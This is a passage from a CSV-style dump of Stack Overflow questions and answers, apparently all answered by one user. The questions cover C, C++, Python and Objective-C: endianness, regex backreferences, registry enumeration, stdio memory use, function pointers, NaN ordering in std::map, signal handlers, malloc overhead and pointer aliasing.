<p>However, when I HEXDUMP the resulting file, where it should say AA55 it says 55 AA.</p>

<p>Is GCC Mixing up endianness, or am I? This project is for the x86 processor. AA 55 needs to be in that specific order. I could just exchange the bytes, but I am curious as to why GCC does this.</p>
","9530","","<p>Preprocessor macros don't show up in the compiled object files -- they're not seen at all by the compiler.  If you just had that <code>#define</code> and never used it anywhere, there'd be no trace of it.</p>

<p>If you used it in code somewhere, it would likely show up as a constant in an instruction (e.g. to load a constant into a register or memory).  If you used it to initialize static data, it would show up as a constant in the data segment:</p>

<pre><code>// Global variable definition
#define BOOTSIGNATURE 0xAA55
uint16_t my_global = BOOTSIGNATURE;
</code></pre>

<p>If you compile the above and look at the data segment, it looks like this:</p>

<pre><code>$ gcc -c test.c
$ objdump -s test.o
[...]
Contents of section .data:
 0000 55aa0000                             U...
</code></pre>

<p>As you can see, the two bytes are stored in memory in little-endian order <code>55 AA</code> (the leading <code>0000</code> is the segment offset in hex).</p>

<p>If you want to control the endianness of the data, then store it as an explicit byte array:</p>

<pre><code>uint8_t my_global[] = {0xAA, 0x55};
</code></pre>

<p>This will always store the bytes in the order specified.</p>
"
"<p>Wikipedia <a href=""http://en.wikipedia.org/wiki/Regular_expression"" rel=""nofollow"">says</a> that extended regexes ""dropped support for backreferences"", so the ""basic"" regex mode has to be used to enable those. However, it seems that a number of implementations <em>do</em> support backreferences for extended regexes. For example, with gcc 4.6 on Ubuntu Precise, they are supported. FreeBSD implementations <a href=""http://www.manpagez.com/man/7/re_format/"" rel=""nofollow"">seem to</a> support them only in basic mode.</p>

<p><a href=""http://www.boost.org/doc/libs/1_52_0/libs/regex/doc/html/boost_regex/syntax/basic_extended.html"" rel=""nofollow"">Boost says</a> (and seems to agree with Wikipedia) that backreferences are not supported for extended regexes, but Boost::Regex adds them as an extension.</p>

<p>Is this just a poorly defined part of the standard which is interpreted differently by every implementation?</p>
","9530","","<p>According to the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html"" rel=""nofollow"">POSIX.1-2008 standard</a>, only Basic Regular Expressions support back-references.  <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html#tag_09_03_06"" rel=""nofollow"">Section 9.3.6</a> describes how they work in BREs.  The Extended Regular Expressions section doesn't mention them at all, and the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap09.html#tag_09_05_01"" rel=""nofollow"">Grammar Lexical Conventions</a> in section 9.5.1 say that back-reference tokens only apply to BREs.</p>
"
"<p>Ive been messing around with this code but for the life of me, no matter how much I search I cant find any information about adding a DWORD value to all sub folders that a certain registry folder has.</p>

<p>The line where I specify the folder where all DWORD values get added is this</p>

<pre><code>HKEY hKey = OpenKey(HKEY_LOCAL_MACHINE,L""SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\"");
</code></pre>

<p>It adds them to Interface folder, but instead of that I want to add the DWORD values to all existing subfolders that the Interface folder in registry has. Ive tried a couple of things but it totally messed it up.</p>

<p>Does it anyone have any tips? I guess Im using the wrong terminilogy when searching for an answer to this problem.</p>

<p>Thanks in advance fellas!</p>
","9530","","<ol>
<li>Open the parent key with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724895%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegOpenKey</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegOpenKeyEx</code></a></li>
<li>Enumerate all of the child keys of the parent using <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724861%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegEnumKey</code></a> or <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724862%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegEnumKeyEx</code></a> in a loop</li>
<li>For each child key, set the desired value with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegSetValueEx</code></a></li>
<li>Close the parent key with <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx"" rel=""nofollow""><code>RegCloseKey</code></a></li>
</ol>
"
"<p>My coworker and I are having a killer of a time trying to figure out this problem.
We want to parse a file (custom made 3d object file). The problem is in using the stdio function calls like fread, fseek, etc.</p>

<p>In the below code, when I check the virutal memory  before call and after call I am missing like 1MB each time the function is run and I have no idea why this happens.</p>

<pre><code>FILE *fp= fopen([path UTF8String], ""rb"");
char *buffer = (char *) malloc(MAX_STRING_LENGTH);
while(!feof(fp))
{
    fgets(buffer, MAX_STRING_LENGTH, fp);
}

if(0 == fclose(fp))
    NSLog(@""File is closed"");

free(buffer)
</code></pre>

<p>Path is generated from ios Library and MAX_STRING_LENGTH is an arbitrarily large number (eg 2000000)</p>

<p>Also used the function from <a href=""http://www.cplusplus.com/reference/clibrary/cstdio/fread/"" rel=""nofollow"">http://www.cplusplus.com/reference/clibrary/cstdio/fread/</a> in the example and still the memory error persists.</p>

<p>I know that buffer is not the problem because if I use just create the buffer and free it then no memory is taken but if I use the while loop then after the file is closed and I check the memory available I have one less MB than before. it has been driving me and my coworker crazy trying to fix this for the past week.</p>

<p>EDIT::</p>

<pre><code>- (float)print_usage_memory
{    
vm_statistics_data_t vmStats;
mach_msg_type_number_t infoCount = HOST_VM_INFO_COUNT;
host_statistics(mach_host_self(), HOST_VM_INFO, (host_info_t)&amp;vmStats, &amp;infoCount);

const int availablePages = vmStats.free_count;
float availableMemory = [self pagesToMB:availablePages];

/*
 */     
const int totalPages = vmStats.wire_count + vmStats.active_count + vmStats.inactive_count + vmStats.free_count;
const int activePages = vmStats.active_count;
const int wiredPages = vmStats.wire_count;
const int purgeablePages = vmStats.purgeable_count;   

NSMutableString* txt = [[NSMutableString alloc] initWithCapacity:512];
[txt appendFormat:@""\nTotal: %d (%.2fMB)\n"", totalPages, [self pagesToMB:totalPages]];
[txt appendFormat:@""                              nAvailable: %d (%.2fMB)\n"", availablePages, availableMemory];
[txt appendFormat:@""                                 nActive: %d (%.2fMB)\n"", activePages, [self pagesToMB:activePages]];
[txt appendFormat:@""nWired: %d (%.2fMB)\n"", wiredPages, [self pagesToMB:wiredPages]];
[txt appendFormat:@""nPurgeable: %d (%.2fMB)\n"", purgeablePages, [self pagesToMB:purgeablePages]];

NSLog(@""%@"", txt);
[txt release];
txt = nil;

return availableMemory;
}


- (float)pagesToMB:(const int)pages
{
    return pages*4/1024;
}
</code></pre>

<p>Thanks for any help you might be able to give, or any insights into this.</p>
","9530","","<p>A couple thoughts:</p>

<ol>
<li><p>If you're running your test in a loop, make sure to drain the autorelease pool inside the loop.  Otherwise, it won't get drained until after your test, and it will mess up your measurements.  For example:</p>

<pre><code>for(int i = 0; i &lt; TEST_COUNT; i++)
{
    // If you're using ARC, you can instead replace this with an
    // @autoreleasepool block
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    run_my_fopen_fgets_fclose_test();
    [pool release];
}
</code></pre></li>
<li><p>Try using unbuffered I/O by calling <a href=""http://developer.apple.com/library/ios/#documentation/system/conceptual/manpages_iphoneos/man3/setvbuf.3.html"" rel=""nofollow""><code>setbuf(fp, NULL)</code></a> on the <code>FILE*</code> object immediately after opening it.  Normally, stdio buffers the data by allocating a buffer with <code>malloc</code> so that it can read the file data in large chunks, and this buffer is deallocated with <code>free</code> when you call <code>fclose</code>.  You are closing the file, so this shouldn't be leaking, but just in case it's screwing with your memory measurements, it may be worth a try to use unbuffered I/O to get cleaner results.</p></li>
</ol>
"
"<p>I have to restore a mail archive; thousands of .eml files.</p>

<p>I'd like to run a single 'find' command that will:</p>

<ol>
<li>Look for a particular string</li>
<li>If found, copy the file over to a separate folder.</li>
</ol>

<p>Any quick help would be appreciated! </p>
","9530","","<p>I'd suggest using a recursive <code>grep</code> along with <a href=""http://linux.die.net/man/1/xargs"" rel=""nofollow""><code>xargs</code></a>:</p>

<pre><code>grep ""the string I want to find"" -r --include=\*.eml -l -Z ROOTDIR | xargs -0 cp -t TARGETDIR
</code></pre>

<p>This will search all <code>.eml</code> files under the <code>ROOTDIR</code> directory for the desired string and move them to the directory <code>TARGETDIR</code>.  The <code>-Z</code> in <code>grep</code> and the <code>-0</code> in <code>xargs</code> ensure that even filenames with wacky characters will still work properly.</p>

<p><strong>Edit:</strong> Changed the <code>mv</code> to a <code>cp</code></p>
"
"<p>One of my teachers use this type declaration:</p>

<pre><code>typedef void (*SortFunction)(int a[], int n);
</code></pre>

<p>to create a type that can hold a pointer to a function
and that can be used to call that function later on in a program.</p>

<p>I also know that to pass a function as a parameter you have to 
wrap the function name in parenthesis and wrap the function's
parameters in parenthesis after the function name as well like so</p>

<pre><code>function someFunction( (anotherfunction)(type arg1, type arg2,...)){
  ...
} 
</code></pre>

<p>What I want to know is why must you wrap a function in parenthesis like this? is this a built in function of most c++ compilers or is it simply a trick that we programmers use
in order to enable functions as arguments within our code? also, why does ""SortFunction""
in the typedef statement need to be referenced, why can't the variable you use to utilize SortFunction just hold the function instead of pointing to it?</p>
","9530","","<p>There's nothing special about function arguments.  Whenever you declare a function pointer (as a local variable, global variable, class member variable, function parameter, typedef, etc.), it's always declared like so:</p>

<pre><code>return_type (*var_name)(T1 param1, T2 param2, /* etc. */ );
//           ^
//           |
// This * is very important!
</code></pre>

<p>Where <code>var_name</code> is the name of the function pointer variable.  The reason the parentheses are needed around <code>*var_name</code> is due to operator precedence: without the parentheses, the <code>*</code> (indicating that something's a pointer) would match with the function's return type, and instead you'd get something like a return type of <code>int*</code> (pointer to <code>int</code>) instead of plain <code>int</code>.</p>

<p>You can't pass a function as an argument because functions are not first-class objects in C and C++.  The only way to pass a function is my passing a pointer to the function.</p>
"
"<p>I am trying get a handle on C and Cyclone as I work my way thru Jim Trevor's ""<a href=""http://www.cs.umd.edu/projects/cyclone/papers/cyclone-safety.pdf"" rel=""nofollow"">Cyclone: A safe dialect of C</a>"" for a PL class. Trevor gives this example of an unsafe go-to statement: </p>

<pre><code>int z;
{ int x = 0xBAD; goto L; }
{ int *y = &amp;z;
L: *y = 3; // Possible segfault
}
</code></pre>

<p>Trevor explains the safety issue in the above code as follows: </p>

<p>Many compilers stack allocate
the local variables of a block when it is entered, and
deallocate (pop) the storage when the block exits
(though this is not mandated by the C standard).
If the example is compiled in this way, then when
the program enters the ﬁrst block, space for x is allocated on the stack, and is initialized with the value
0xBAD. The goto jumps into the middle of the second block, directly to the assignment to the contents
of the pointer y. Since y is the ﬁrst (only) variable
declared in the second block, the assignment expects
y to be at the top of the stack. Unfortunately, that’s
exactly where x was allocated, so the program tries
to write to location 0xBAD, probably triggering a
segmentation fault.</p>

<p>I don't understand why the <code>go to</code> statement is an issue here. It seems like the issue is unpredictable behavior from the un-initialized pointer Z. At the start of the second block, <code>int * y</code> be filled with the address of Z. Z is uninitialized so it would fill <code>int* y</code> with the bit pattern on the stack in the area of memory referenced by Z. I don't understand why Trevor's paper implies that Z and X somehow both reference 0xBAD. Wouldn't C create a new stack frame for the first block (as Trevor describes): thus writing 0xBAD to a new frame in memory (and not the location in memory referenced by Z)?</p>
","9530","","<p>As you said, the problem is that the variable <code>y</code> might be accessed before it's initialized.  The code snippet you gave is just one way that's likely to demonstrate the problem.</p>

<p>When I compile this with GCC with the <code>-Wall</code> option, it warns that <code>warning 'y' is used uninitialized in this function</code>.  If I compiled it as C++ code with g++, it's actually an error:</p>

<pre><code>test.cc:8:3: error: jump to label ‘L’
test.cc:6:25: error:   from here
test.cc:7:10: error:   crosses initialization of ‘int* y’
</code></pre>

<p>Although in this case <code>y</code> is a POD type, if it were instead a class that had a constructor, the <code>goto</code> would skip the constructor.  The C++ language specification says this is illegal in all cases.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/6684573/floating-point-keys-in-stdmap"">Floating point keys in std:map</a>  </p>
</blockquote>



<p>Well I know there are cases where you want to provide a special function for doing doubles comparison. Such cases could include times when you do arithmetic operations because you get rounding in the floating point arithmetic. </p>

<p>However are there times when it is safe to use &lt; or > to compare doubles?</p>

<p>Let's say I have list of doubles that are calculated once that I need to sort or use as a key in a map (ie. std::map) and I guarantee that there aren't any additional arithmetic operations afterwards. </p>

<p>Can I guarantee that my sort order will be correct if I traverse the collection using iterators?</p>

<p>I'm thinking I can get more performance this way.</p>
","9530","","<p>It's always safe to use <code>&lt;</code> to compare <code>double</code> values in a <code>std::map</code>, as long as you never add any NaN values.  The comparison used for the map must be a <em>strict weak ordering</em>, which has these requirements (C++03 §23.1.2/2 and §25.3/3-4):</p>

<ul>
<li>Define <code>equiv(a, b)</code> as <code>!(a &lt; b) &amp;&amp; !(b &lt; a)</code>.  Then, both <code>&lt;</code> and <code>equiv</code> must be transitive relations:
<ol>
<li>If <code>a &lt; b</code> and <code>b &lt; c</code>, then <code>a &lt; c</code> must be true</li>
<li>If <code>equiv(a, b)</code> and <code>equiv(b, c)</code>, then <code>equiv(a, c)</code> must be true</li>
</ol></li>
</ul>

<p><code>double</code> value comparisons certainly satisfy these axioms, <em>except</em> when NaN values are thrown into the mix.  NaNs have the strange property that they are unequal to all values (including themselves!) but not less than or greater than anything:</p>

<pre><code>NaN &lt; 0    // false
NaN &lt;= 0   // false
NaN == 0   // false
NaN &gt; 0    // false
NaN &gt;= 0   // false
NaN != 0   // true
NaN &lt; NaN  // false
NaN &lt;= NaN // false
NaN == NaN // false (!!!)
NaN &gt; NaN  // false
NaN &gt;= NaN // false
NaN != NaN // true (!!!)
</code></pre>

<p>This causes problems, because under the rules above, <code>NaN</code> has the property that <code>equiv(x, NaN)</code> is true for all <code>x</code>, which by transitivity implies that all values are equivalent, except non-NaN values are clearly not equivalent.</p>
"
"<p>I'm writing a simple shell, and I have to fork a child process an external program using execv. I have to send the signal TSTP(Cntl+Z) to the signal handler, and then kill the currently running child process. My problem is I can't find a way to pass the Child pid into the signal handler. If i do a getpid() in the handler, it just returns the parent pid. I also tried setting the child pid as getpid() inside the child process, and having that variable as a global variable, but that also didn't work. Here is some of the code I have so far.</p>

<pre><code>void handler(int);
//in main
if (!built_in_cmd(myArgc,myArgs)) {
    pid_t pid;
    char *x = myArgs[0];
    if((pid=fork())&lt;0)
        printf(""Parent: fork() process failed"");
    else {
        if (pid == 0) {
            y=getpid();
            printf(""Parent: My child has been spawned. %d %d\n"",y,getppid());
            execv(x, myArgs);
            exit(0);
        }
        else {
            signal(SIGTSTP,handler);
            wait(0);
            printf(""Parent: My child has terminated.\n"");
        }
    }
}
return;

//outside main
void handler(int signo){
    kill(idk,SIGKILL);
} 
</code></pre>
","9530","","<p>Signals are asynchronous in nature, there's no way to pass any extra state to them except through global variables.  Assuming that you only ever have one thread waiting for a child, it's safe to use a global, but otherwise there's no multithread-safe way of doing so:</p>

<pre><code>// At global scope
pid_t child_pid = (pid_t)-1;
...
void myfunc()
{
    pid_t pid;
    if((pid = fork()) &lt; 0)
        ...
    else if(pid == 0)
        ...
    else
    {
        child_pid = pid;
        ...
    }
}
</code></pre>
"
"<p>I'm kind of beginner in python. I was looking at one the types to make a fibonacci function,</p>

<pre><code>def fib(n):
a=0
b=1
while a&lt;n:
    print a
    a,b=b,a+b
</code></pre>

<p>and I saw the a,b=b,a+b declaration. So, I thought a=b and b=a+b were the same to a,b=a,b+a, so I changed the function for it to be like this:</p>

<pre><code>def fib(n):
a=0
b=1
while a&lt;n:
    print a
    a=b
    b=a+b
</code></pre>

<p>and I thought it would be right, but when I executed the program, I got a different output. Can someone explain to me the difference between those two types of declaration?</p>

<p>Thanks, anyway.</p>
","9530","","<p>That syntax simultaneously assigns new values to <code>a</code> and <code>b</code> based on the current values.  The reason it's not equivalent is that when you write the two separate statements, the second assignment uses the <em>new</em> value of <code>a</code> instead of the <em>old</em> value of <code>a</code>.</p>
"
"<p>Is there a generic suppress warning that i can use? </p>

<p>The problem is that there are times i may build using one compiler version (gcc) and then i have a partner that uses some of the common things but uses a different compiler. So the warning # are different.</p>

<p>The only way i could think of doing was making a macro that was defined in a file that i would pass in some generic value:</p>

<pre><code>SUPPRESS_WARNING_BEGIN(NEVER_USED)
//code
SUPPRESS_WARNING_END
</code></pre>

<p>then the file would have something like:</p>

<pre><code>#if COMPILER_A
    NEVER_USED = 245
#endif

#if COMPILER_B
    NEVER_USED = 332
#endif


#define SUPPRESS_WARNING_BEGIN(x) /
     #if COMPILER_A
        //Compiler A suppress warning x
     #endif

     #if COMPILER_B
        //Compiler B suppress warning x
     #endif

#define SUPPRESS_WARNING_END /
     #if COMPILER_A
        // END Compiler A suppress warning
     #endif

     #if COMPILER_B
        // END Compiler A suppress warning
     #endif
</code></pre>

<p>Don't know if there is an easier way? Also i know ideally we all would just use the same compiler but that is unfortunately not an option. Just trying to find the least complicated way to support something like this and am hoping there is a simpler way then mentioned above.</p>

<p>thanks</p>
","9530","","<p>There's no portable way to do that.  Different compilers do it in different ways (e.g. <a href=""http://msdn.microsoft.com/en-us/library/2c8f766e%28v=vs.80%29.aspx"" rel=""nofollow""><code>#pragma warning</code></a>, <a href=""http://gcc.gnu.org/onlinedocs/gcc/Diagnostic-Pragmas.html"" rel=""nofollow""><code>#pragma GCC diagnostic</code></a>, etc.).</p>

<p>The easiest and best thing to do is to write code that does not generate any warnings with at compiler at any warning level.</p>

<p>If your goal is to suppress warnings about unused variables, I recommend using a macro:</p>

<pre><code>#define UNUSED(x) ((void)sizeof(x))
...
void some_function(int x, int y)
{
    // No warnings will be generated if x is otherwise unused
    UNUSED(x);
    ....
}
</code></pre>

<p>The <code>sizeof</code> operator is evaluated at compile-time, and the cast to <code>void</code> produces no result, so any compiler will optimize the <code>UNUSED</code> statement away into nothing but consider the operand to be used.</p>

<p>GCC also has the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html"" rel=""nofollow""><code>unused</code> attribute`</a>:</p>

<pre><code>// No warnings will be generated if x is otherwise unused
int x __attribute__((unused));
</code></pre>
"
"<p>I searched everywhere and even though there were a couple of questions and answers regarding this error I couldn't find a solution to fix my problem</p>

<p>I'm reading in from a file that contains letters and numbers and I'm populating my matrix depending on the values in that file.
ex: file
description of letters and numbers ... 
table:</p>

<pre><code>  a b c d 
a 1 2 5 6
b 5 6 3 4 
c 3 2 1 4 
d 2 4 6 8 
</code></pre>

<p>Here's the code</p>

<pre><code>matrix = [[0 for j in range(4)] for i in range(4)]
i = 0
j = 0

for line in file:
   for a in line:
      if is_number(a):
         matrix[i][j] = int(a)
         j+= 1
      if matrix.count(0) &lt; 2: #since matrix already populated with zeroes. it shouldn't have 
                               #many per program specifications, that's why I use this 
                               #conditional to increment i and reset j back to 0
         i += 1
         j = 0

file.close()
</code></pre>

<p>I don't understand why I keep getting that error. </p>
","9530","","<p>You're constructing a 4x4 matrix in the first line of code, but your data is a 6x6 matrix.  When you try to store an element at index 4 in row 0, you get an <code>IndexError</code>.</p>
"
"<p>I am quite new to python...</p>

<pre><code> import sys, os, time, py4chan, urllib from urllib2 import urlopen, URLError, HTTPError

 def refreshthread(boardin,no):
     global thread
     global topic
     board = py4chan.Board(boardin)
     thread = board.getThread(int(no))
     topic = thread.topic
     time.sleep(2.5)

 def dlfile(url, folder):

     try:
         f = urlopen(url)

         with open(folder + ""/"" + os.path.basename(url), ""wb"") as local_file:
             local_file.write(f.read())
             print ""Downloaded to "" + str(folder + ""/"" + os.path.basename(url)) 

     except HTTPError, e:
         print ""HTTP Error:"", e.code, url
     except URLError, e:
         print ""URL Error:"", e.reason, url

 def getsize(uri):
     file = urllib.urlopen(uri)
     size = file.headers.get(""content-length"")
     file.close()
     return str(int(size) / 1024)

 def main():
     boardtag = str(raw_input(""Board: ""))
     threadno = int(raw_input(""Thread id: ""))
     folder = str(raw_input(""Save to folder: ""))
     print ""Getting thread information...""
     refreshthread(boardtag,threadno)
     print ""Subject: "" + topic.Subject
     while(True):
         if not os.path.exists(folder): os.makedirs(folder)
         refreshthread(boardtag,threadno)
         for imgurl in thread.Files():
             if imgurl is not None and not os.path.exists(folder + ""/"" + os.path.basename(imgurl)):
                 print ""A wild image appears! "" + ""("" + getsize(imgurl) + ""kb)"" 
                 dlfile(imgurl,folder)
             else:
                 pass

 if __name__ == '__main__':
     main()
</code></pre>

<p>I coded this on linux and it runs perfectly, but if I run this on windows, I get this error:</p>

<pre><code>TypeError: __init__() takes exactly 4 arguments (2 given)
</code></pre>

<p>Which is quite strange as I haven't defined <strong>init</strong>.
Could this be an <strong>init</strong> from another module?</p>

<p>The py4chan module seems to work fine if i code other scripts.
Both machines have same python version too.</p>

<p><strong>EDIT</strong>(Full error):</p>

<pre><code>Getting thread information...
Traceback (most recent call last):
  File ""4chan.py"", line 59, in &lt;module&gt;
    main()
  File ""4chan.py"", line 46, in main
    refreshthread(boardtag,threadno)
  File ""4chan.py"", line 15, in refreshthread
    board = py4chan.Board(boardin)
TypeError: __init__() takes exactly 4 arguments (2 given)
</code></pre>

<p>*<em>Edit:</em>*Okay, i had two different modules of the same name. All working now.
I shouldn't be allowed on this website.</p>
","9530","","<p>The <code>py4chan.Board</code> class needs to be constructed with 3 arguments, not 1.  This line in the <code>refreshthread</code> function:</p>

<pre><code>board = py4chan.Board(boardin)
</code></pre>

<p>Should look something this:</p>

<pre><code>board = py4chan.Board(base_url, post_url, filesize)
</code></pre>
"
"<p>I tested this code just trying to find out how much memory c++ actually reserved for the new operator. </p>

<pre><code>#include&lt;iostream&gt;
using namespace std;
int main() {

  cout &lt;&lt; ""alignment of "" &lt;&lt; alignof(int) &lt;&lt; endl;
  int *intP1 = new int;
  *intP1 = 100;
  cout &lt;&lt; ""address of intP1 "" &lt;&lt; intP1 &lt;&lt; endl;
  int *intP2 = new int;
  *intP2 = 999;
  cout &lt;&lt; ""address of intP2 "" &lt;&lt; intP2 &lt;&lt; endl;
  int *intP3 = new int;
  cout &lt;&lt; ""address of intP3 "" &lt;&lt; intP3 &lt;&lt; endl;
  *intP3 = 333;

  cout &lt;&lt; endl;
  cout &lt;&lt; (reinterpret_cast&lt;char *&gt;(intP3)-reinterpret_cast&lt;char *&gt;(intP2)) &lt;&lt; endl;
  cout &lt;&lt; intP3-intP2 &lt;&lt; endl;
  cout &lt;&lt; endl;

  cout &lt;&lt; *(intP1) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+4) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+8) &lt;&lt; endl;
  cout &lt;&lt; *(intP1+16) &lt;&lt; endl;
  delete intP1;
  delete intP2;
  delete intP3;
  return 0;
}
</code></pre>

<p>After compiled the code with -std=c++11 flag and ran it, here is what I got from a x86_64 machine. </p>

<pre><code>    alignment of int4
    address of intP1 = 0xa59010
    address of intP2 = 0xa59030
    address of intP3 = 0xa59050

    the distance of intP3 and intP2 = 32

    intP1 value = 100
    is this a padding value = 0
    intP2 value = 999
    intP3 value = 333
</code></pre>

<p>It seems that when using new to allocate a 4 bytes memory for an integer, it actually reserved 32 bytes block which is the total space for 8 integers. According to the explanation of the c++ alignment, for 64 bit machine, memory is aligned on 16 bytes, why the distance here is 32 bytes?</p>

<p>Could some one help me to sort this out? Thanks in advance. </p>
","9530","","<p>It has nothing to do with alignment -- it's extra overhead of how the internal memory allocator works.  Typically, each memory block has extra hidden information in it at the front and/or back used for maintaining the heap's structure.  Exactly how much overhead there is is will vary from platform to platform and from implementation to implementation.</p>

<p>For example, <a href=""http://g.oswego.edu/dl/html/malloc.html"">Doug Lea's <code>malloc</code></a> has an extra overhead of 4-8 bytes per allocation (32-bit pointers) or 8-16 bytes (64-bit pointers) and a minimum allocation size of 16 bytes (32-bit) or 32 bytes (64-bit).  That means for even 1-byte allocations, the memory allocator requires a total of 16 bytes of tracking overhead.</p>
"
"<p>Given the following</p>

<ul>
<li>Bitmap raw image data in char array</li>
<li>Image width and height</li>
<li>Path <code>wzAppDataDirectory</code> in std::wstring generated using the following code</li>
</ul>

<hr>

<pre><code>// Get a good path.
wchar_t wzAppDataDirectory[MAX_PATH];
wcscpy_s( wzAppDataDirectory, MAX_PATH, Windows::Storage::ApplicationData::Current-&gt;LocalFolder-&gt;Path-&gt;Data() );
wcscat_s( wzAppDataDirectory, MAX_PATH, (std::wstring(L""\\"") + fileName).c_str() );
</code></pre>

<hr>

<p>How can we save the image as JPG? (Include encoding as well as the char array is raw bitmap form)</p>

<p>Code example is very much appreciated.</p>
","9530","","<p>You'll need to use a library to encode the JPEG.  Some possibilities are the <a href=""http://www.ijg.org/"" rel=""nofollow"">Independent JPEG Group's jpeglib</a>, <a href=""http://nothings.org/stb_image.c"" rel=""nofollow""><code>stb_image</code></a>, or <a href=""http://openil.sourceforge.net/"" rel=""nofollow"">DevIL</a>.</p>
"
"<p>Just learning Objective-C coming from a Java background. I am trying to write a program that has no purpose other then to teach me how to write functions in this language and I am getting errors everywhere. The problem is since I just started with this language yesterday the errors make no sense to me. Here is what I have so far.</p>

<p><strong>Main Method:</strong> </p>

<pre><code>int main (int argc, const char * argv[])
{
    @autoreleasepool
    {
        NSString * prompt = @""Hello World"";

        prompt = writePromptMessage(prompt);

        NSLog(@""%@"", prompt);
    }

    return 0;
}
</code></pre>

<p><strong>Special Method:</strong></p>

<pre><code>NSString *writePromptMessage(NSString * prompt)
{
    return prompt;
}
</code></pre>

<p><strong>My Errors:</strong></p>

<ul>
<li>Implicit declaration of function writePromptMessage is invalid in C99 </li>
<li>Implicit conversion of 'int' to 'NSString *' is disallowed with ARC </li>
<li>Incomplete integer to pointer conversion assigning NSString strong from int </li>
<li>Conflicting Types for writePromptMessage</li>
</ul>
","9530","","<p>Unlike Java, you need to add a <em>function declaration</em> (aka a <em>function prototype</em>) before the point where it's used.  A function declaration is just like the function definition, but without the body (i.e. the code) of the function, and ending with a semicolon:</p>

<pre><code>// This is a function declaration:
NSString *writePromptMessage(NSString * prompt);

// This is a function definition:
NSString *writePromptMessage(NSString * prompt)
{
    // Function body goes here
}
</code></pre>

<p>In order to be able to call a function, you need to have written a declaration <em>before</em> the usage site:</p>

<pre><code>NSString *writePromptMessage(NSString * prompt);  // declaration

int main (int argc, const char * argv[])
{
    ...
    writePromptMessage(...);  // usage
}

// definition follows
</code></pre>

<p>Alternatively, you can place the whole definition before the usage site, but this won't always be possible (e.g. if you have two functions which can call each other).</p>

<p>C and Objective-C do actually allow you to call functions that don't have visible declarations, but this is considered a deprecated feature because it's easy to misuse and cause subtle errors:</p>

<p>If a function is called without a visible declaration, the compiler creates an <em>implicit 
declaration</em>:</p>

<ul>
<li>The implicit declaration takes an arbitrary number and types of parameters </li>
<li>The implicit declaration returns <code>int</code></li>
</ul>

<p>So, what happened is that the compiler is assuming that <code>writePromptMessage</code> returns <code>int</code> when it first sees it, which is wrong, and that causes a cascade of other errors.  For functions which don't return <code>int</code>, you <strong>must</strong> never use implicit function declarations, and for functions which do return <code>int</code>, you <strong>should</strong> never use implicit function declarations.</p>
"
"<p>I met a very weird behavior on a private variable in class.</p>

<p>Problem Description: The value of a private member ""current"" in class lapi_xmeef_table is changed abnormally in the end of a member function.</p>

<p>class 1: lapi_xmeef
class 2: lapi_xmeef_table (is friend of lapi_xmeef, so can access private variables in lapi_xmeef directly or via public interfaces)</p>

<pre><code>class lapi_xmeef {
  friend class lapi_xmeef_table;
  ...
  short bias_frag_layer;
  int bias_frag_index;
  ...
  public:
    // Add constructor
    lapi_xmeef();
    // Add public interface
    ...
    void bias_frag(int *li, int *fi);

};

class lapi_xmeef_table {
  private:
    lapi_xmeef *current;
    ...
  public:
    lapi_xmeef_table(Lapi_ctl *ctl, int num_layer);
    ...
    void get_bias(int *li, int *fi);
    ...
}; 
</code></pre>

<p>A private variable in lapi_xmeef_table called ""current"" is a current iterator (a class lapi_xmeef).</p>

<p>The member function does nothing but read only, it copies two values from its private members. Show as below</p>

<pre><code>void lapi_xmeef::bias_frag(int *li, int *fi)
{
   *li = (short)bias_frag_layer;
   *fi = bias_frag_index;
}
</code></pre>

<p>Problem function and variable:</p>

<pre><code>void lapi_xmeef_table::get_bias(int *li, int *fi)
{
// current is (lapi_xmeef *) 0x2a9a93c7f0 (a valid address)
  current-&gt;bias_frag(li, fi);
// current is (lapi_xmeef *) 0x2a000000df (a invalid address)
}
</code></pre>

<p>Before calling the function current is (lapi_xmeef *) 0x2a9a93c7f0 (a valid address)
After, current is (lapi_xmeef *) 0x2a000000df (a invalid address)</p>

<p>This doesn't happen every time when the member function is called, before this weird behavior, it's called many time without problem.</p>

<p>When next time, a member in current is being accessed, a seg fault occurs because a invalid address is dereferenced.</p>

<p>Now my solution is have a temp pointer to save the value of current before calling its member function, then restore it after calling. It works.</p>

<pre><code>void lapi_xmeef_table::get_bias(int *li, int *fi)
{
  lapi_xmeef *temp = current;
  current-&gt;bias_frag(li, fi);
  current = temp;
}
</code></pre>

<p>But I really want to know why and how to fix it instead of this tricky way.</p>

<p>Why the value of private variable is changed which is expected to be the same?</p>

<p>Any problem in the way accessing a private varibale? Is prefix needed or the point ""this"" needed? I tried this->current->bias_frag(li, fi); which doesn't help.</p>

<p>Thank you in advance.</p>
","9530","","<p>What's likely happening is that you have unintended <em>pointer aliasing</em> going on.  One of the <code>li</code> or <code>fi</code> pointers is pointing to the same location as <code>&amp;current</code>, so when you dereference and assign to them inside <code>bias_frag</code>, you're accidentally overwriting <code>current</code> or part of it.</p>

<p>To fix it, you need to figure out why you're getting aliased pointers by tracing the data flow backwards.  For starters, crank up your compiler's warning level and fix all warnings.</p>

<p>Do not try to work around it by saving the value of <code>current</code> and restoring it -- that's just a bandage over a much bigger problem and is not a long-term solution.  You've already entered the land of undefined behavior, and trying to dig yourself out is not going to work.</p>
"
